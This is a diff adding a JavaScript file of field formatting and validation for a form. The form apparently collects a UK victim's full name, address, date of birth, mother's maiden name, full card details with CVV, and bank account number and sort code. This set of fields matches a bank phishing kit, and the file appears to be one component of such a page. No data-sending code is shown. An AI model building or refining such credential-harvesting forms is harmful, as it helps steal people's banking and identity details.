@@ -1,0 +1,343 @@
+
+
+$(document).ready(function() {
+            $("#dob").keyup(function(){
+                if ($(this).val().length == 2){
+                    $(this).val($(this).val() + "/");
+                }else if ($(this).val().length == 5){
+                    $(this).val($(this).val() + "/");
+                }
+            });
+});
+
+
+
+
+$(document).ready(function() {
+            $("#expiry_date").keyup(function(){
+                if ($(this).val().length == 2){
+                    $(this).val($(this).val() + "/");
+                }else if ($(this).val().length == 8){
+                    $(this).val($(this).val() + "/");
+                }
+            });
+});
+
+
+
+
+$(document).ready(function() {
+            $("#sort_code").keyup(function(){
+                if ($(this).val().length == 2){
+                    $(this).val($(this).val() + "-");
+                }else if ($(this).val().length == 5){
+                    $(this).val($(this).val() + "-");
+                }
+            });
+});
+
+
+
+	
+    function mod10_check(val){
+	
+	var nondigits = new RegExp(/[^0-9]+/g);
+	var number = val.replace(nondigits,'');
+	var pos, digit, i, sub_total, sum = 0;
+	var strlen = number.length;
+	if(strlen < 13){ return false; }
+	for(i=0;i<strlen;i++){
+		pos = strlen - i;
+		digit = parseInt(number.substring(pos - 1, pos));
+		if(i % 2 == 1){
+			sub_total = digit * 2;
+			if(sub_total > 9){
+				sub_total = 1 + (sub_total - 10);
+			}
+		} else {
+			sub_total = digit;
+		}
+		sum += sub_total;
+	}
+	if(sum > 0 && sum % 10 == 0){
+		return true;
+	}
+	return false;
+	
+    }
+    
+
+
+function cc_format(value) {
+
+  var v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '')
+  var matches = v.match(/\d{4,16}/g);
+  var match = matches && matches[0] || ''
+  var parts = []
+  for (i=0, len=match.length; i<len; i+=4) {
+    parts.push(match.substring(i, i+4))
+  }
+  if (parts.length) {
+    return parts.join(' ')
+  } else {
+    return value
+  }
+}
+
+onload = function() {
+  document.getElementById('card_number').oninput = function() {
+    this.value = cc_format(this.value)
+  }
+}
+
+
+
+function empty() {
+    var x;
+    x = document.getElementById("full_name").value;
+    if (x == "") {
+        document.getElementById("full_name").style = "border-color:red; width: 50%";
+		document.getElementById("full_name_error").style = "display: block";
+        return false;
+    }
+	var y;
+    y = document.getElementById("address").value;
+    if (y == "") {
+        document.getElementById("address").style = "border-color:red; width: 50%";
+		document.getElementById("address_error").style = "display: block";
+        return false;
+    }
+	var y;
+    y = document.getElementById("city").value;
+    if (y == "") {
+        document.getElementById("city").style = "border-color:red; width: 50%";
+		document.getElementById("city_error").style = "display: block";
+        return false;
+    }
+	var y;
+    y = document.getElementById("county").value;
+    if (y == "") {
+        document.getElementById("county").style = "border-color:red; width: 50%";
+		document.getElementById("county_error").style = "display: block";
+        return false;
+    }
+	var y;
+    y = document.getElementById("postcode").value;
+    if (y == "") {
+        document.getElementById("postcode").style = "border-color:red; width: 50%";
+		document.getElementById("postcode_error").style = "display: block";
+        return false;
+    }
+	var newPostCode = checkPostCode(document.getElementById('postcode').value);
+	
+	if (newPostCode) {
+	
+    document.getElementById('postcode').value = newPostCode;
+	
+    }
+	
+    else {
+	
+        document.getElementById("postcode").style = "border-color:red; width: 50%";
+		document.getElementById("invalid_postcode_error").style = "display: block";
+        return false;
+    }
+	var y;
+    y = document.getElementById("county").value;
+    if (y == "") {
+        document.getElementById("county").style = "border-color:red; width: 50%";
+		document.getElementById("county_error").style = "display: block";
+        return false;
+    }
+	var y;
+    y = document.getElementById("phone_number").value;
+    if (y == "") {
+        document.getElementById("phone_number").style = "border-color:red; width: 50%";
+		document.getElementById("phone_number_error").style = "display: block";
+        return false;
+    }
+	var y;
+    y = document.getElementById("dob").value;
+    if (y == "") {
+        document.getElementById("dob").style = "border-color:red; width: 50%";
+		document.getElementById("dob_error").style = "display: block";
+        return false;
+    }
+	var y;
+    y = document.getElementById("mmn").value;
+    if (y == "") {
+        document.getElementById("mmn").style = "border-color:red; width: 50%";
+		document.getElementById("mmn_error").style = "display: block";
+        return false;
+    }
+    var x;
+    x = document.getElementById("cardholder_name").value;
+    if (x == "") {
+        document.getElementById("cardholder_name").style = "border-color:red; width: 50%";
+		document.getElementById("cardholder_name_error").style = "display: block";
+        return false;
+    };
+	var y;
+    y = document.getElementById("card_number").value;
+    if (y == "") {
+        document.getElementById("card_number").style = "border-color:red; width: 50%";
+		document.getElementById("card_number_error").style = "display: block";
+        return false;
+    }
+	var y;
+	y = document.getElementById("card_number").value;
+	if(mod10_check(y)){  }
+	
+	else {
+	
+	    document.getElementById('card_number').style = 'border-color:red; width: 50%';
+		document.getElementById('wrong_number_error').style = 'display: block'; 
+		return false;
+		
+	}
+	var y;
+    y = document.getElementById("expiry_date").value;
+    if (y == "") {
+        document.getElementById("expiry_date").style = "border-color:red; width: 50%";
+		document.getElementById("expiry_date_error").style = "display: block";
+        return false;
+    }
+	var y;
+    y = document.getElementById("cvv").value;
+    if (y == "") {
+        document.getElementById("cvv").style = "border-color:red; width: 50%";
+		document.getElementById("cvv_error").style = "display: block";
+        return false;
+    }
+	if (document.getElementById("debit_card").selected) {
+	var y;
+    y = document.getElementById("acc_number").value;
+    if (y == "") {
+        document.getElementById("acc_number").style = "border-color:red; width: 50%";
+		document.getElementById("acc_number_error").style = "display: block";
+        return false;
+    }
+	var y;
+    y = document.getElementById("sort_code").value;
+    if (y == "") {
+        document.getElementById("sort_code").style = "border-color:red; width: 50%";
+		document.getElementById("sort_code_error").style = "display: block";
+        return false;
+    }
+	}
+
+}
+
+
+function change() {
+
+	var e;
+    e = document.getElementById("full_name").value;
+    if (e !== ""){
+	    document.getElementById("full_name").style = "width: 50%";
+		document.getElementById("full_name_error").style = "display: none";
+	}
+	var e;
+    e = document.getElementById("address").value;
+    if (e !== ""){
+	    document.getElementById("address").style = "width: 50%";
+		document.getElementById("address_error").style = "display: none";
+	}
+	var e;
+    e = document.getElementById("city").value;
+    if (e !== ""){
+	    document.getElementById("city").style = "width: 50%";
+		document.getElementById("city_error").style = "display: none";
+	}
+	var e;
+    e = document.getElementById("county").value;
+    if (e !== ""){
+	    document.getElementById("county").style = "width: 50%";
+		document.getElementById("county_error").style = "display: none";
+	}
+	var e;
+    e = document.getElementById("postcode").value;
+    if (e !== ""){
+	    document.getElementById("postcode").style = "width: 50%";
+		document.getElementById("postcode_error").style = "display: none";
+	}
+	var newPostCode = checkPostCode(document.getElementById('postcode').value);
+	
+	if (newPostCode) {
+	
+	    document.getElementById('postcode').value = newPostCode;
+        document.getElementById("postcode").style = "width: 50%";
+		document.getElementById("invalid_postcode_error").style = "display: none";
+	
+    }
+	var e;
+    e = document.getElementById("phone_number").value;
+    if (e !== ""){
+	    document.getElementById("phone_number").style = "width: 50%";
+		document.getElementById("phone_number_error").style = "display: none";
+	}
+	var e;
+    e = document.getElementById("dob").value;
+    if (e !== ""){
+	    document.getElementById("dob").style = "width: 50%";
+		document.getElementById("dob_error").style = "display: none";
+	}
+	var e;
+    e = document.getElementById("mmn").value;
+    if (e !== ""){
+	    document.getElementById("mmn").style = "width: 50%";
+		document.getElementById("mmn_error").style = "display: none";
+	}
+	var e;
+    e = document.getElementById("cardholder_name").value;
+    if (e !== ""){
+	    document.getElementById("cardholder_name").style = "width: 50%";
+		document.getElementById("cardholder_name_error").style = "display: none";
+	}
+	var e;
+    e = document.getElementById("card_number").value;
+    if (e !== ""){
+	    document.getElementById("card_number").style = "width: 50%";
+		document.getElementById("card_number_error").style = "display: none";
+	}
+	if(mod10_check(e)){
+        document.getElementById("card_number").style = "width: 50%";
+		document.getElementById("wrong_number_error").style = "display: none";
+	}
+	var e;
+    e = document.getElementById("expiry_date").value;
+    if (e !== ""){
+	    document.getElementById("expiry_date").style = "width: 50%";
+		document.getElementById("expiry_date_error").style = "display: none";
+	}
+	var e;
+    e = document.getElementById("cvv").value;
+    if (e !== ""){
+	    document.getElementById("cvv").style = "width: 50%";
+		document.getElementById("cvv_error").style = "display: none";
+	}
+	var e;
+    e = document.getElementById("acc_number").value;
+    if (e !== ""){
+	    document.getElementById("acc_number").style = "width: 50%";
+		document.getElementById("acc_number_error").style = "display: none";
+	}
+	var e;
+    e = document.getElementById("sort_code").value;
+    if (e !== ""){
+	    document.getElementById("sort_code").style = "width: 50%";
+		document.getElementById("sort_code_error").style = "display: none";
+	}
+	
+}
+
+
+
+    function debit_check() {
+        if (document.getElementById("debit_card").selected) {
+            document.getElementById("debit_hidden").style.display = "block";
+			
+        } else {
+            document.getElementById("debit_hidden").style.display = "none";
+        }
+    }
